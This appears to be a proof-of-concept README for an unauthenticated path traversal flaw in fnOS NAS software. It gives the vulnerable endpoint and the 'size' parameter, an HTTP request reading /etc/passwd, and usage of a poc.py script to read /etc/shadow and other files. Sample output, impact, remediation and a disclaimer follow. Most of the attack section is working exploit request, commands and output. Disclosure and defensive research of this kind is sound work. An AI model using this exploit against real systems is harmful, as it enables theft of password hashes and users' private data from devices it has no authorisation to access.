# fnOS Path Traversal / Arbitrary File Read Vulnerability

## Overview
A critical path traversal vulnerability exists in **fnOS** versions 0.8.41 through 1.1.14 that allows unauthenticated remote attackers to read **arbitrary files** on the server, including sensitive system files such as `/etc/shadow` containing password hashes.


## Affected Endpoint
```
/app-center-static/serviceicon/myapp/%7B0%7D/
```

## Vulnerable Parameter
```
size
```

## Proof of Concept

### HTTP Request - Read /etc/passwd
```http
GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1
Host: <target>
```
### Using POC Script
```bash
# Default: read /etc/passwd
python poc.py -u http://<target>:<port>

# Read specific file
python poc.py -u http://<target>:<port> -f /etc/shadow
python poc.py -u http://<target>:<port> -f /etc/hosts

```

**Parameters:**
- `-u, --url`: Target URL (required)
- `-f, --file`: File to read (default: /etc/passwd)

### Example Output
```
[*] Target: http://target:14725
[*] File: /etc/passwd
[*] Testing path traversal vulnerability...
[*] Payload: ?size=../../../../etc/passwd
[*] Status Code: 200
[+] VULNERABLE - Path traversal detected!
[+] Response preview:
--------------------------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
--------------------------------------------------
```

## Impact
An unauthenticated remote attacker can:
- Read **any file** on the server readable by the web server process
- Access `/etc/passwd` and `/etc/shadow` containing password hashes
- Obtain sensitive configuration files and credentials
- Potentially achieve complete system compromise through offline password cracking
- Access user private data stored on the NAS

## Remediation
- Update to the latest patched version when available
- Implement proper input validation for the `size` parameter
- Restrict access to the affected endpoint

## Disclaimer
This vulnerability disclosure is intended for educational and authorized security research purposes only. Use this information responsibly and only on systems you have permission to test.
